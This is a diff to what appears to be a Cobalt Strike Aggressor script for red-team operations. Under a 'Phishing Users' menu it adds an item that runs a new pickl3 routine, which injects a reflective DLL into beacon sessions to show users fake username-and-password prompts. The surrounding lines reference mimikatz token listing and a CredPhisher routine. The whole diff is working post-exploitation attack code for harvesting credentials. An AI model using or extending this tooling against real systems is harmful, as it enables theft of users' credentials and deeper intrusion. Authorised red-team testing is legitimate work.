@@ -271,10 +271,21 @@ item "List Enterprise Admin Tokens  - T1134"{
 }
 #################################################
 
-#   Phishing Users
+#   Phishing Users 
 
 #################################################
 menu "Phishing Users"{
+
+#Run pickl3
+
+		item "Prompt for Username and Password  - T1141"{
+			local('$bid');
+				foreach $bid ($1){
+					pickl3($bid);
+				}
+			}
+
+
 #Run CredPhisher
 		
 		item "Prompt for Username and Password  - T1141"{
@@ -603,6 +614,10 @@ bmimikatz($1, "token::list /enterpriseadmin");
 #   Phishing Users
 
 #################################################
+
+sub pickl3 {
+	bdllspawn($1, script_resource("/exe/pickl3_reflective_dll.dll"), $1, "pickl3", 5000, false);
+}
 
 # Phish Users with small pop up box
 sub credphisher{
